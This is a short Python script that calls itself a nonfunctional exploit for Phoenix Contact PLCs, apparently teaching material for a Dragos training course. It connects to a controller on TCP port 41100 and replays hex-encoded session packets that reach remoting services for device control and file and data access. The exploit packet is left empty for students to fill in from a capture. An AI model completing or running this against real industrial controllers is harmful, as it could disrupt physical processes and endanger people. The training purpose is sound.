# This is a nonfunctional exploit for Phoenix Contact PLCs, for use in the Dragos training course
# 

import binascii
import socket
import sys
# Students must fill this in with packet data from their capture!
EXPLOIT = ''

def usage():
  print "Usage: ", sys.argv[0], "<ip address>"
  exit(1)

def fillin():
  print "You must fill in the EXPLOIT variable with the exploit packet!"
  exit(2)

if len(sys.argv) < 2:
  usage()
if '' == EXPLOIT:
  fillin()

init_packets = [ '0100000000002700000000000000d7ff4164652e52656d6f74696e672e53657276696365732e4953656375726974795365727669636500',
'0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e49446576696365496e666f536572766963653200',
'010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446576696365496e666f5365727669636500',
'0100000000002f00000000000000cfff4164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c536572766963653200',
'0100000000002e0000000000000000004164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c5365727669636500',
'0100000000003000000000000000ceff4164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653300',
'010000000000300000000000000000004164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653200',
'0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e4944617461416363657373536572766963653300',
'010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446174614163636573735365727669636500',
'0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e4944617461416363657373536572766963653200',
'010002000000020002000600000000000100',
'01000300000000000200060000000000'
]

def send_recv(s, strpkt):
  s.send(binascii.unhexlify(strpkt))
  s.recv(4096)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = sys.argv[1]
port = 41100
s.connect((ip, port))
for pkt in init_packets:
  send_recv(s, pkt)
send_recv(EXPLOIT)
